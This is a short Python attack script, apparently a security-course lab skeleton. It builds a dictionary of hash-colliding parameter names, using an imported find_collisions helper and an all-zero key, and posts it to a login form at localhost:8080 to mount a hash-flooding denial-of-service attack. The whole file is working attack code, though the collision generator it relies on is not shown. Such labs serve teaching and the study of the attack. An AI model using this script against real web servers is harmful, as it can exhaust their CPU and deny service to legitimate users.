from requests import codes, Session
from collisions import find_collisions

LOGIN_FORM_URL = "http://localhost:8080/login"

key = b'\x00'*16

#This function will send the login form
#with the colliding parameters you specify.
def do_login_form(sess, username,password,params=None):
	data_dict = {"username":username,\
			"password":password,\
			"login":"Login"
			}
	if not params is None:
		data_dict.update(params)
	response = sess.post(LOGIN_FORM_URL,data_dict)
	print(response)


def do_attack():
	sess = Session()

  	#Choose any valid username and password
	uname ="attacker"
	pw = "attacker"

  	#Put your colliding inputs in this dictionary as parameters.
	print("finding collisions")
	attack_dict = {collision: 0 for collision in find_collisions(key, 5)}

	print("starting attack")
	response = do_login_form(sess, uname, pw, attack_dict)
	
	print("response received")
	print(response)



if __name__=='__main__':
	do_attack()
